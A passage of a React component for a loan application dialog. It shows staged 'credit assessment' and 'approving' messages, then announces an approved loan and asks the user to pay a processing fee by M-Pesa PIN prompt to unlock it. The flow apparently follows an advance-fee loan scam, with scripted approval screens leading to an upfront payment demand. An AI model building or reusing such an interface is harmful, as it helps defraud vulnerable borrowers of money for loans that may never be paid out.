                    <p className="text-muted-foreground italic">Processing credit assessment...</p>
                  </>
                )}

                {/* Approving */}
                {processingState === "approving" && (
                  <>
                    <Loader2 className="w-12 h-12 mx-auto animate-spin text-primary" />
                    <h3 className="text-xl font-bold">Processing Your Application</h3>
                    <p className="text-muted-foreground">Please wait while we process your loan request...</p>
                    <p className="text-muted-foreground italic">Approving loan...</p>
                  </>
                )}

                {/* Approved */}
                {processingState === "approved" && (
                  <>
                    <Loader2 className="w-12 h-12 mx-auto animate-spin text-primary" />
                    <h3 className="text-xl font-bold">Processing Your Application</h3>
                    <p className="text-muted-foreground">Please wait while we process your loan request...</p>
                    <p className="text-muted-foreground italic">Approved! Redirecting to M-Pesa...</p>
                  </>
                )}

                {/* STK Push */}
                {processingState === "stk-push" && (
                  <>
                    <div className="space-y-4">
                      <div className="flex items-center justify-center">
                        <div className="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center mr-2">
                          <span className="text-white text-xs">✓</span>
                        </div>
                      </div>
                      <p className="text-foreground text-center leading-relaxed">
                        <strong>Kshs {loanAmount.toLocaleString()} loan has been approved.</strong> Please pay <strong>Kshs {calculateProcessingFee(loanAmount).toLocaleString()}</strong> as a processing fee to unlock your loan. You will receive an M-Pesa prompt to enter your PIN shortly.
                      </p>
                    </div>
                  </>
                )}
              </div>
            )}

            {/* Navigation Buttons */}
            {processingState === "idle" && (
              <div className="flex justify-between pt-4">
                <Button
                  variant="outline"
                  onClick={handleBack}
                  disabled={currentStep === 1}
                >
                  <ArrowLeft className="w-4 h-4 mr-2" />
                  Back
                </Button>
                {currentStep < 4 ? (
                  <Button
                    onClick={handleNext}
                    className="bg-primary hover:bg-primary/90 text-primary-foreground"
                  >
                    Continue
                    <ArrowRight className="w-4 h-4 ml-2" />
                  </Button>
                ) : (
                  <Button
                    onClick={handleSubmit}
                    className="bg-primary hover:bg-primary/90 text-primary-foreground"
                    disabled={requestLoanMutation.isPending || !termsAccepted}
                  >
                    {requestLoanMutation.isPending ? "Submitting..." : "Submit Application"}
                  </Button>
                )}
              </div>
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
